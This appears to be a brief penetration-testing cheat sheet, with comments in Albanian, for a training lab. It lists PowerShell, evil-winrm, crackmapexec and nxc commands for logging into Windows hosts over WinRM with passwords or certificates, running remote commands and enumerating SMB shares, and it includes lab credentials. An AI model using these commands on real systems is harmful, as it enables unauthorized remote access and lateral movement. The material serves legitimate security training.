From Windows
```bash
# Lidhje me WinRM nga Windows 
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password) Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

From Linux
```bash
# Lidhje me Evil-WinRM nga Linux 
gem install evil-winrm e
evil-winrm -i 10.129.201.234 -u forend -p 'pass'

# menyre alternative
evil-winrm -i 10.129.10.4  -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

# Lidhur permes Certifikates dhe Private Key
evil-winrm -i 10.129.10.4 -S -c cert.crt -k private.key

# crackmapexc
crackmapexec winrm 10.129.10.248 -u USER -p PASSWORD

# See if user have access
nxc winrm 10.129.10.248 -u USER -p PASSWORD

# Execute command into system
nxc winrm 10.129.10.248 -u USER -p PASSWORD -x whoami

# Shikojm file ne sherbimi smb
nxc smb 10.129.10.248 -u USER -p PASSWORD --shares
```

